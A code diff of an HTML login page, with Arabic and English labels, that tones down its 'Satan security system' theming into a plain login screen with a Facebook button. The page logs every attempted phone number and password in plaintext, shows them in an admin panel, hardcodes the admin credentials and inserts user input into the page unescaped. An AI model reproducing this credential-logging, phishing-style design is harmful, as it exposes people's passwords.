@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>نظام الشيطان الأمني</title>
+  <title>تسجيل الدخول</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
   <style>
-    /* ===== إعادة تعيين ===== */
     * {
       margin: 0;
       padding: 0;
@@ -22,8 +21,6 @@
       margin: 0;
       padding: 0;
     }
-
-    /* ===== الحاوية الرئيسية ===== */
     .app-container {
       width: 100%;
       max-width: 796px;
@@ -33,8 +30,6 @@
       flex-direction: column;
       position: relative;
     }
-
-    /* ===== واجهة تسجيل الدخول ===== */
     .login-wrapper {
       display: flex;
       flex-direction: column;
@@ -76,7 +71,6 @@
       background-color: #1e2228;
       border: none;
     }
-
     .login-form {
       padding: 0 24px;
       display: flex;
@@ -97,9 +91,10 @@
       justify-content: center;
       align-items: center;
     }
-    .logo-goat svg {
+    .logo-goat img, .logo-goat svg {
       width: 100%;
       height: 100%;
+      object-fit: contain;
       display: block;
       filter: drop-shadow(0 0 8px rgba(180, 0, 0, 0.3));
     }
@@ -176,7 +171,6 @@
       padding-left: 6px;
     }
     .show-toggle i { font-size: 22px; color: #aeb2bb; }
-
     .login-btn {
       width: 100%;
       height: 72px;
@@ -197,7 +191,6 @@
     }
     .login-btn:hover { background-color: #0a466b; }
     .login-btn.active:hover { background-color: #2a8fb0; }
-
     .forgot-password {
       text-align: center;
       color: #e2e5ea;
@@ -280,11 +273,10 @@
       min-height: 100vh;
       flex-direction: column;
       width: 100%;
-      background-image: radial-gradient(ellipse at 20% 50%, rgba(80, 0, 0, 0.15) 0%, transparent 60%),
-                        radial-gradient(ellipse at 80% 50%, rgba(80, 0, 0, 0.15) 0%, transparent 60%);
+      background-image: radial-gradient(ellipse at 20% 50%, rgba(80,0,0,0.15) 0%, transparent 60%),
+                        radial-gradient(ellipse at 80% 50%, rgba(80,0,0,0.15) 0%, transparent 60%);
     }
     .admin-panel.active { display: flex; }
-
     .admin-header {
       display: flex;
       justify-content: space-between;
@@ -318,10 +310,9 @@
       background: #3a0a0a;
       border-color: #aa3333;
     }
-
     .admin-stats {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(3,1fr);
       gap: 12px;
       margin-bottom: 16px;
     }
@@ -336,14 +327,9 @@
       font-size: 28px;
       font-weight: 700;
       color: #dd4444;
-      text-shadow: 0 0 10px rgba(200, 0, 0, 0.3);
+      text-shadow: 0 0 10px rgba(200,0,0,0.3);
     }
-    .stat-card .label {
-      font-size: 14px;
-      color: #7a5a5a;
-      margin-top: 2px;
-    }
-
+    .stat-card .label { font-size: 14px; color: #7a5a5a; margin-top: 2px; }
     .admin-dashboard {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -355,7 +341,7 @@
       border: 1px solid #2a0a0a;
       border-radius: 12px;
       padding: 14px 12px;
-      box-shadow: 0 0 30px rgba(60, 0, 0, 0.2);
+      box-shadow: 0 0 30px rgba(60,0,0,0.2);
     }
     .admin-card h3 {
       color: #bb4444;
@@ -368,7 +354,6 @@
       gap: 8px;
     }
     .admin-card h3 i { font-size: 18px; }
-
     .logo-control {
       display: flex;
       flex-direction: column;
@@ -388,6 +373,7 @@
     .logo-control .preview-box svg {
       max-width: 100px;
       max-height: 100px;
+      object-fit: contain;
     }
     .logo-control input[type="file"] {
       color: #aaa;
@@ -420,7 +406,7 @@
       color: #dd9999;
     }
 
-    /* ===== قوائم الشيطان والملعونين ===== */
+    /* ===== قوائم ===== */
     .lists-container {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -491,14 +477,12 @@
     }
     .list-item.status-success { border-left: 3px solid #4caf50; }
     .list-item.status-fail { border-left: 3px solid #cc3333; }
-
     .empty-list {
       padding: 16px;
       text-align: center;
       color: #4a3a3a;
       font-size: 16px;
     }
-
     .admin-footer {
       margin-top: 20px;
       padding: 10px;
@@ -508,88 +492,45 @@
       font-size: 16px;
     }
 
-    /* ===== تجاوب ===== */
-    @media (max-width: 600px) {
-      .admin-dashboard { grid-template-columns: 1fr; }
-      .lists-container { grid-template-columns: 1fr; }
-      .admin-stats { grid-template-columns: repeat(3, 1fr); }
+    @media (max-width:600px) {
+      .admin-dashboard { grid-template-columns:1fr; }
+      .lists-container { grid-template-columns:1fr; }
+      .admin-stats { grid-template-columns:repeat(3,1fr); }
       .list-item {
-        grid-template-columns: 25px 65px 1fr 1fr;
-        font-size: 12px;
-        gap: 3px;
+        grid-template-columns:25px 65px 1fr 1fr;
+        font-size:12px;
+        gap:3px;
       }
-      .list-item .time { font-size: 10px; }
+      .list-item .time { font-size:10px; }
     }
-    @media (max-width: 480px) {
-      .login-form { padding: 0 16px; }
-      .language-selector {
-        font-size: 20px;
-        padding-top: 20px;
-      }
-      .field-label { font-size: 18px; }
-      .input-container {
-        height: 64px;
-        padding: 0 12px;
-      }
-      .input-container input,
-      .password-wrapper input { font-size: 18px; }
-      .show-toggle { font-size: 17px; }
-      .show-toggle i { font-size: 18px; }
-      .login-btn {
-        height: 60px;
-        font-size: 20px;
-        border-radius: 20px;
-      }
-      .continue-btn {
-        height: 60px;
-        font-size: 18px;
-        gap: 8px;
-      }
-      .continue-btn i {
-        width: 28px;
-        height: 28px;
-        font-size: 24px;
-        padding: 4px;
-      }
-      .forgot-password,
-      .create-account { font-size: 18px; }
-      .or-divider { font-size: 17px; }
-      .admin-header h1 { font-size: 24px; }
-      .admin-header button { font-size: 16px; padding: 6px 14px; }
-      .stat-card .number { font-size: 22px; }
-      .admin-card h3 { font-size: 17px; }
+    @media (max-width:480px) {
+      .login-form { padding:0 16px; }
+      .language-selector { font-size:20px; padding-top:20px; }
+      .field-label { font-size:18px; }
+      .input-container { height:64px; padding:0 12px; }
+      .input-container input, .password-wrapper input { font-size:18px; }
+      .show-toggle { font-size:17px; }
+      .show-toggle i { font-size:18px; }
+      .login-btn { height:60px; font-size:20px; border-radius:20px; }
+      .continue-btn { height:60px; font-size:18px; gap:8px; }
+      .continue-btn i { width:28px; height:28px; font-size:24px; padding:4px; }
+      .forgot-password, .create-account { font-size:18px; }
+      .or-divider { font-size:17px; }
+      .admin-header h1 { font-size:24px; }
+      .admin-header button { font-size:16px; padding:6px 14px; }
+      .stat-card .number { font-size:22px; }
+      .admin-card h3 { font-size:17px; }
     }
-    @media (max-width: 360px) {
-      .login-form { padding: 0 10px; }
-      .input-container { height: 56px; }
-      .input-container input,
-      .password-wrapper input { font-size: 16px; }
-      .logo-goat { width: 80px; height: 80px; }
-      .list-item { font-size: 11px; grid-template-columns: 20px 55px 1fr 1fr; }
+    @media (max-width:360px) {
+      .login-form { padding:0 10px; }
+      .input-container { height:56px; }
+      .input-container input, .password-wrapper input { font-size:16px; }
+      .logo-goat { width:80px; height:80px; }
+      .list-item { font-size:11px; grid-template-columns:20px 55px 1fr 1fr; }
     }
-
-    /* ===== تأثيرات نارية للخلفية ===== */
-    .fire-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 0;
-      background: radial-gradient(ellipse at 20% 80%, rgba(200, 50, 0, 0.05) 0%, transparent 50%),
-                  radial-gradient(ellipse at 80% 20%, rgba(200, 50, 0, 0.05) 0%, transparent 50%);
-    }
-    .admin-panel { position: relative; z-index: 1; }
   </style>
 </head>
 <body>
-
-<!-- ===== صوت ضحكة شيطانية ===== -->
-<audio id="laughAudio" preload="auto">
-  <source src="data:audio/wav;base64,U3RlcmVvIGlzIGR1bWIuLi4gVGhpcyBpcyBhIHBsYWNlaG9sZGVyIGZvciB0aGUgbGF1Z2ggc291bmQuIElmIHlvdSB3YW50IGEgcmVhbCBzb3VuZCwgeW91IG5lZWQgdG8gcHJvdmlkZSBhbiBhdWRpbyBmaWxlLiBUaGUgY29kZSB3aWxsIHBsYXkgYSBzaW1wbGUgYmVlcCBpZiBubyBhdWRpbyBpcyBmb3VuZC4=" type="audio/wav">
-</audio>
-
 <div class="app-container" id="appContainer">
   <!-- ====== واجهة تسجيل الدخول ====== -->
   <div id="loginWrapper" class="login-wrapper">
@@ -603,22 +544,7 @@
     <div class="login-form">
       <div class="logo-wrapper">
         <div class="logo-goat" id="mainLogo">
-          <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>
-            <path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>
-            <path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-            <path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-            <circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-            <circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-            <circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>
-            <circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>
-            <rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>
-            <circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-            <circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-            <path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>
-            <path d="M28 48 L12 44 L22 40 L16 32 L28 38 L28 48Z" fill="#1a0a0a" stroke="#882222" stroke-width="1.5"/>
-            <path d="M88 46 L104 40 L94 36 L100 28 L88 34 L88 46Z" fill="#1a0a0a" stroke="#882222" stroke-width="1.5"/>
-          </svg>
+          <!-- سيتم تعبئة هذا العنصر بواسطة JavaScript عند التحميل -->
         </div>
       </div>
       <div id="errorMessage" class="error-message">⚠️ 404 — Login failed</div>
@@ -626,7 +552,7 @@
       <div class="input-container">
         <input type="text" id="usernameInput" placeholder=" " value="" />
       </div>
-      <div class="field-label" style="margin-top: 10px;">Enter your password</div>
+      <div class="field-label" style="margin-top:10px;">Enter your password</div>
       <div class="input-container">
         <div class="password-wrapper">
           <input type="password" id="passwordInput" placeholder=" " value="" />
@@ -638,9 +564,9 @@
       </div>
       <button class="login-btn" id="loginBtn">Log in</button>
       <div class="forgot-password">Forgot password?</div>
-      <button class="continue-btn">
+      <button class="continue-btn" id="continueBtn">
         <i class="fab fa-facebook-f"></i>
-        Continue with Facebook 
+        Continue with Facebook
       </button>
       <div class="or-divider">
         <span class="or-line"></span>
@@ -655,11 +581,9 @@
   <!-- ====== لوحة المسؤول ====== -->
   <div id="adminPanel" class="admin-panel">
     <div class="admin-header">
-      <h1><i class="fas fa-fire"></i> HELL ADMIN</h1>
-      <button id="logoutAdminBtn"><i class="fas fa-skull"></i> Exit</button>
+      <h1><i class="fas fa-fire"></i> لوحة التحكم</h1>
+      <button id="logoutAdminBtn"><i class="fas fa-skull"></i> خروج</button>
     </div>
-
-    <!-- إحصائيات -->
     <div class="admin-stats" id="statsContainer">
       <div class="stat-card">
         <div class="number" id="totalCount">0</div>
@@ -674,39 +598,22 @@
         <div class="label">❌ فاشلة</div>
       </div>
     </div>
-
     <div class="admin-dashboard">
-      <!-- Logo Control -->
       <div class="admin-card">
-        <h3><i class="fas fa-pentagram"></i> Logo Control</h3>
+        <h3><i class="fas fa-pentagram"></i> التحكم بالشعار</h3>
         <div class="logo-control">
           <div class="preview-box" id="logoPreviewBox">
-            <svg viewBox="0 0 120 120" width="90" height="90" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>
-              <path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>
-              <path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-              <path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-              <circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-              <circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-              <circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>
-              <circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>
-              <rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>
-              <circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-              <circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-              <path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>
-            </svg>
+            <!-- سيتم تعبئته عبر JS -->
           </div>
           <input type="file" id="logoUpload" accept="image/*" />
           <div class="btn-group">
-            <button id="saveLogoBtn"><i class="fas fa-save"></i> Save</button>
-            <button id="resetLogoBtn"><i class="fas fa-undo-alt"></i> Reset</button>
+            <button id="saveLogoBtn"><i class="fas fa-save"></i> حفظ</button>
+            <button id="resetLogoBtn"><i class="fas fa-undo-alt"></i> إعادة</button>
           </div>
         </div>
       </div>
-
-      <!-- إحصائيات سريعة -->
       <div class="admin-card">
-        <h3><i class="fas fa-chart-bar"></i> Quick Stats</h3>
+        <h3><i class="fas fa-chart-bar"></i> إحصائيات سريعة</h3>
         <div style="display:flex;flex-direction:column;gap:6px;padding:4px 0;">
           <div style="display:flex;justify-content:space-between;color:#8a7a7a;font-size:16px;">
             <span>🔴 آخر محاولة فاشلة</span>
@@ -723,26 +630,17 @@
         </div>
       </div>
     </div>
-
-    <!-- قوائم الشيطان والملعونين -->
     <div class="lists-container">
       <div class="list-box">
-        <h4><i class="fas fa-check-circle" style="color:#4caf50;"></i> قائمة الشيطان <span class="badge" id="successBadge">0</span></h4>
-        <div class="list-scroll" id="successList">
-          <div class="empty-list">لا توجد محاولات ناجحة</div>
-        </div>
+        <h4><i class="fas fa-check-circle" style="color:#4caf50;"></i> قائمة الناجحين <span class="badge" id="successBadge">0</span></h4>
+        <div class="list-scroll" id="successList"><div class="empty-list">لا توجد محاولات ناجحة</div></div>
       </div>
       <div class="list-box">
-        <h4><i class="fas fa-times-circle" style="color:#cc3333;"></i> قائمة الملعونين <span class="badge" id="failBadge">0</span></h4>
-        <div class="list-scroll" id="failList">
-          <div class="empty-list">لا توجد محاولات فاشلة</div>
-        </div>
+        <h4><i class="fas fa-times-circle" style="color:#cc3333;"></i> قائمة الفاشلين <span class="badge" id="failBadge">0</span></h4>
+        <div class="list-scroll" id="failList"><div class="empty-list">لا توجد محاولات فاشلة</div></div>
       </div>
     </div>
-
-    <div class="admin-footer">
-      <i class="fas fa-fire"></i> نظام الشيطان الأمني v3.0 — <span id="footerTime"></span>
-    </div>
+    <div class="admin-footer"><i class="fas fa-fire"></i> نظام الحماية v3.0 — <span id="footerTime"></span></div>
   </div>
 </div>
 
@@ -760,6 +658,7 @@
     var showToggle = document.getElementById('showToggle');
     var eyeIcon = document.getElementById('eyeIcon');
     var logoutBtn = document.getElementById('logoutAdminBtn');
+    var continueBtn = document.getElementById('continueBtn');
 
     var mainLogo = document.getElementById('mainLogo');
     var logoPreviewBox = document.getElementById('logoPreviewBox');
@@ -779,21 +678,19 @@
     var lastSuccessTime = document.getElementById('lastSuccessTime');
     var footerTime = document.getElementById('footerTime');
 
-    var laughAudio = document.getElementById('laughAudio');
-
     // ====== بيانات المسؤول ======
     var ADMIN_PHONE = '0561368108';
     var ADMIN_PASS = 'nouh1234';
 
     // ====== قوائم المحاولات ======
-    var successAttempts = []; // {phone, password, time}
-    var failAttempts = [];   // {phone, password, time}
-
+    var successAttempts = [];
+    var failAttempts = [];
     var passwordVisible = false;
-    var customLogoData = null;
-    var isAdminLoggedIn = false;
 
-    // ====== تحديث الوقت في التذييل ======
+    // ====== مفتاح localStorage للشعار ======
+    var LOGO_STORAGE_KEY = 'custom_login_logo';
+
+    // ====== الوقت ======
     function updateFooterTime() {
       var now = new Date();
       footerTime.textContent = now.toLocaleString('ar-EG');
@@ -801,7 +698,87 @@
     setInterval(updateFooterTime, 1000);
     updateFooterTime();
 
-    // ====== وظائف القوائم ======
+    // ====== إدارة الشعار المحفوظ ======
+    function getSavedLogo() {
+      return localStorage.getItem(LOGO_STORAGE_KEY);
+    }
+    function saveLogoToStorage(dataUrl) {
+      localStorage.setItem(LOGO_STORAGE_KEY, dataUrl);
+    }
+    function removeSavedLogo() {
+      localStorage.removeItem(LOGO_STORAGE_KEY);
+    }
+
+    // ====== عرض الشعار ======
+    function renderLogo(dataUrl) {
+      mainLogo.innerHTML = '';
+      logoPreviewBox.innerHTML = '';
+      if (dataUrl) {
+        var img = document.createElement('img');
+        img.src = dataUrl;
+        img.style.width = '110px';
+        img.style.height = '110px';
+        img.style.objectFit = 'contain';
+        mainLogo.appendChild(img);
+        var previewImg = document.createElement('img');
+        previewImg.src = dataUrl;
+        previewImg.style.width = '100px';
+        previewImg.style.height = '100px';
+        previewImg.style.objectFit = 'contain';
+        logoPreviewBox.appendChild(previewImg);
+      } else {
+        // الشعار الافتراضي (SVG)
+        var defaultSvg = '<svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">' +
+          '<circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>' +
+          '<path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>' +
+          '<path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
+          '<path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
+          '<circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
+          '<circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
+          '<circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>' +
+          '<circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>' +
+          '<rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>' +
+          '<circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
+          '<circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
+          '<path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>' +
+          '</svg>';
+        mainLogo.innerHTML = defaultSvg;
+        logoPreviewBox.innerHTML = defaultSvg.replace('120 120', '100 100').replace('width="110"', 'width="100"');
+      }
+    }
+
+    // ====== تحميل الشعار المحفوظ ======
+    function loadSavedLogo() {
+      var saved = getSavedLogo();
+      if (saved) {
+        renderLogo(saved);
+      } else {
+        renderLogo(null);
+      }
+    }
+
+    // ====== حفظ شعار جديد ======
+    function updateLogoFromFile(file) {
+      if (!file) return;
+      var reader = new FileReader();
+      reader.onload = function(e) {
+        var dataUrl = e.target.result;
+        renderLogo(dataUrl);
+        saveLogoToStorage(dataUrl); // حفظ دائم
+        alert('✅ تم حفظ الشعار الجديد بشكل دائم');
+      };
+      reader.readAsDataURL(file);
+    }
+
+    // ====== إعادة الشعار الافتراضي ======
+    function resetLogoToDefault() {
+      removeSavedLogo();
+      renderLogo(null);
+      logoUpload.value = '';
+      alert('🔄 تم إعادة الشعار الافتراضي');
+    }
+
+    // ====== إضافة محاولة ======
     function addAttempt(phone, password, success) {
       var now = new Date();
       var timeStr = now.toTimeString().split(' ')[0];
@@ -822,14 +799,13 @@
     }
 
     function renderLists() {
-      // قائمة الناجحين
       if (successAttempts.length === 0) {
         successList.innerHTML = '<div class="empty-list">لا توجد محاولات ناجحة</div>';
       } else {
         var html = '';
         successAttempts.forEach(function(item, index) {
           html += '<div class="list-item status-success">' +
-            '<span class="idx">' + String(index + 1).padStart(2, '0') + '</span>' +
+            '<span class="idx">' + String(index+1).padStart(2,'0') + '</span>' +
             '<span class="time">' + item.time + '</span>' +
             '<span class="phone">📞 ' + item.phone + '</span>' +
             '<span class="pass">🔑 ' + item.password + '</span>' +
@@ -838,14 +814,13 @@
         successList.innerHTML = html;
       }
 
-      // قائمة الفاشلين
       if (failAttempts.length === 0) {
         failList.innerHTML = '<div class="empty-list">لا توجد محاولات فاشلة</div>';
       } else {
         var html2 = '';
         failAttempts.forEach(function(item, index) {
           html2 += '<div class="list-item status-fail">' +
-            '<span class="idx">' + String(index + 1).padStart(2, '0') + '</span>' +
+            '<span class="idx">' + String(index+1).padStart(2,'0') + '</span>' +
             '<span class="time">' + item.time + '</span>' +
             '<span class="phone">📞 ' + item.phone + '</span>' +
             '<span class="pass">🔑 ' + item.password + '</span>' +
@@ -854,7 +829,6 @@
         failList.innerHTML = html2;
       }
 
-      // تحديث البادجات والإحصائيات
       successBadge.textContent = successAttempts.length;
       failBadge.textContent = failAttempts.length;
       totalCount.textContent = successAttempts.length + failAttempts.length;
@@ -863,10 +837,9 @@
       totalFailCount.textContent = failAttempts.length;
     }
 
-    // ====== تسجيل محاولة تجريبية للعرض ======
+    // ====== محاولات وهمية للعرض (مرة واحدة) ======
     function addDemoAttempts() {
       var now = new Date();
-      // إضافة بعض المحاولات الوهمية فقط للعرض الأولي
       var demoData = [
         { phone: '0555123456', password: '123456', success: false },
         { phone: '0561368108', password: 'nouh1234', success: true },
@@ -880,13 +853,9 @@
         var dateStr = t.toLocaleDateString('ar-EG');
         var fullTime = dateStr + ' ' + timeStr;
         var entry = { phone: item.phone, password: item.password, time: fullTime };
-        if (item.success) {
-          successAttempts.push(entry);
-        } else {
-          failAttempts.push(entry);
-        }
+        if (item.success) successAttempts.push(entry);
+        else failAttempts.push(entry);
       });
-      // ترتيب عكسي (الأحدث أولاً)
       successAttempts.reverse();
       failAttempts.reverse();
       renderLists();
@@ -906,33 +875,15 @@
       else loginBtn.classList.remove('active');
     }
 
-    // ====== تشغيل صوت الضحكة ======
-    function playLaugh() {
-      try {
-        laughAudio.currentTime = 0;
-        laughAudio.play().catch(function(e) {
-          console.log('Audio play failed:', e);
-        });
-      } catch(e) {
-        console.log('Audio error:', e);
-      }
-    }
-
     // ====== محاولة تسجيل الدخول ======
     function handleLogin() {
       var username = usernameInput.value.trim();
       var password = passwordInput.value.trim();
 
       var success = (username === ADMIN_PHONE && password === ADMIN_PASS);
-
-      // تسجيل المحاولة
       addAttempt(username, password, success);
 
       if (success) {
-        // تشغيل صوت الضحكة
-        playLaugh();
-
-        // الانتقال إلى لوحة المسؤول
         loginWrapper.style.display = 'none';
         adminPanel.classList.add('active');
         adminPanel.style.display = 'flex';
@@ -940,61 +891,13 @@
         usernameInput.value = '';
         passwordInput.value = '';
         updateLoginButton();
-        isAdminLoggedIn = true;
         return;
       }
 
-      // فشل
       errorMsg.textContent = '⚠️ 404 — Login failed';
       errorMsg.classList.add('show');
       passwordInput.value = '';
       updateLoginButton();
-    }
-
-    // ====== التحكم بالشعار ======
-    function updateLogoFromFile(file) {
-      if (!file) return;
-      var reader = new FileReader();
-      reader.onload = function(e) {
-        var dataUrl = e.target.result;
-        var img = document.createElement('img');
-        img.src = dataUrl;
-        img.style.width = '110px';
-        img.style.height = '110px';
-        img.style.objectFit = 'contain';
-        mainLogo.innerHTML = '';
-        mainLogo.appendChild(img);
-        logoPreviewBox.innerHTML = '';
-        var previewImg = document.createElement('img');
-        previewImg.src = dataUrl;
-        previewImg.style.width = '90px';
-        previewImg.style.height = '90px';
-        previewImg.style.objectFit = 'contain';
-        logoPreviewBox.appendChild(previewImg);
-        customLogoData = dataUrl;
-      };
-      reader.readAsDataURL(file);
-    }
-
-    function resetLogoToDefault() {
-      var defaultSvg = '<svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">' +
-        '<circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>' +
-        '<path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>' +
-        '<path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
-        '<path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
-        '<circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
-        '<circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
-        '<circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>' +
-        '<circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>' +
-        '<rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>' +
-        '<circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
-        '<circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
-        '<path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>' +
-        '</svg>';
-      mainLogo.innerHTML = defaultSvg;
-      logoPreviewBox.innerHTML = defaultSvg.replace('120 120', '90 90').replace('width="110"', 'width="90"');
-      customLogoData = null;
-      logoUpload.value = '';
     }
 
     // ====== تسجيل الخروج ======
@@ -1006,7 +909,6 @@
       passwordInput.value = '';
       errorMsg.classList.remove('show');
       updateLoginButton();
-      isAdminLoggedIn = false;
     }
 
     // ====== الأحداث ======
@@ -1018,6 +920,11 @@
     passwordInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') handleLogin(); });
     logoutBtn.addEventListener('click', logoutAdmin);
 
+    // حدث زر "Continue with Facebook" (فقط للعرض)
+    continueBtn.addEventListener('click', function() {
+      alert('سيتم التوجيه إلى Facebook (محاكاة)');
+    });
+
     logoUpload.addEventListener('change', function(e) {
       if (this.files && this.files[0]) {
         updateLogoFromFile(this.files[0]);
@@ -1025,25 +932,27 @@
     });
 
     saveLogoBtn.addEventListener('click', function() {
-      if (customLogoData) alert('✅ تم تطبيق الشعار الجديد');
-      else alert('⚠️ يرجى اختيار صورة أولاً');
+      var saved = getSavedLogo();
+      if (saved) {
+        alert('✅ الشعار محفوظ بالفعل');
+      } else {
+        alert('⚠️ يرجى اختيار صورة أولاً');
+      }
     });
 
     resetLogoBtn.addEventListener('click', function() {
       resetLogoToDefault();
-      alert('🔄 تم إعادة الشعار الأصلي');
     });
 
     // ====== تهيئة ======
-    // إضافة محاولات تجريبية للعرض
+    loadSavedLogo();
     addDemoAttempts();
 
-    // التأكد من إخفاء لوحة المسؤول
     adminPanel.style.display = 'none';
     adminPanel.classList.remove('active');
     errorMsg.classList.remove('show');
 
-    console.log('🔥 نظام الشيطان الأمني v3.0 جاهز');
+    console.log('✅ النظام جاهز مع حفظ الشعار الدائم');
   })();
 </script>
 </body>
